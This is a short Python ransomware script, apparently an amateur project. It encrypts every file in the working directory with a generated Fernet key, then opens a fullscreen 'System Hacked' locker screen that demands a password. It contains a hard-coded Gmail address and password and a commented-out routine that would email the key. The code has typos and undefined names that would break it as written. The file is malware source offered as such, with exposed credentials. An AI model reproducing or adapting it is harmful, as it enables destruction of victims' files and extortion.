import os 
import smtplib
from tkinter import Tk, Entry, Label
from cryptography.fernet import Fernet
from tkinter.font import Font
import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep 
file_list=[]
for file in os.listdir():
    if file == "ransowtware.py" or file == "generatedkey.key":
        continune
    if os.path.isfile(file):
        file_list.append(file)
print(f"{file_list} \n")
key=Fernet.generate_key()
print(f"key= {key}")
mail="miracberktasdemir202@gmail.com"
passwd="berk2011"
print("beni bulmanız daha kolay.D")
#def send_key_code(key):
    #email_server=smtplib.SMTP("smtp.gmail.com",587)
    #email_server.server.starttls()
    #email_server.login("miracberktasdemir202@gmail.com","berk2011")
    #email_server.sendmail("miracberktasdemir202@gmail.com","miracberktassdemir@gmail.com",key)
    #print("[+]login")
    #print("[+]key is sending...")
#send_key_code()

print("uppppppsssssssssssssssssss.")
send_key_code()
with open("generetedkey.key","wb") as generatedkey:
    generatedkey.write(key)

print("[+]carking....")
print("[+]crak")

for file in file_list:
    with open(file,"rb") as the_file:
        contensts=teh_file.read()
    contents_encryted=Fernet(key).encrypt(contensts)
    with open(file,"wb") as the_file:
        the_file.write(contents_encryted)
def locker_on():
    window = Tk()
    pyautogui.FAILSAFE = False

    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()

    window.title("System Hacked")

    window.attributes("-fullscreen",True)

    entry = Entry(window, font = 1)
    entry.place(width = 150, height=50, x = width/2-75,y=height/2-25)

    label0 = Label(window,text="Locker", font=1)
    label0.grid(row = 0, column = 0)
    label1 = Label(window, text="Enter password and press Ctrl C", font ="Arial 20")
    label1.place(x=width/2-75-130, y=height/2-25-100)

    window.update()
    sleep(0.2)

    click(width/2, height/2)

    def callback(event):
        global k, entry
        if entry.get()=="şafak":
            k = True

    def on_closing():
        click(width/2, height/2)
        moveTo(width/2,height/2)

        window.attributes("-fullscreen", True)

        window.protocol("WM_DELETE_WİNDOW", on_closing)
        window.update()

        window.bind("<Control-KeyPress-c>",callback)
        

    k = False 

    while not k:
        on_closing()
locker_on()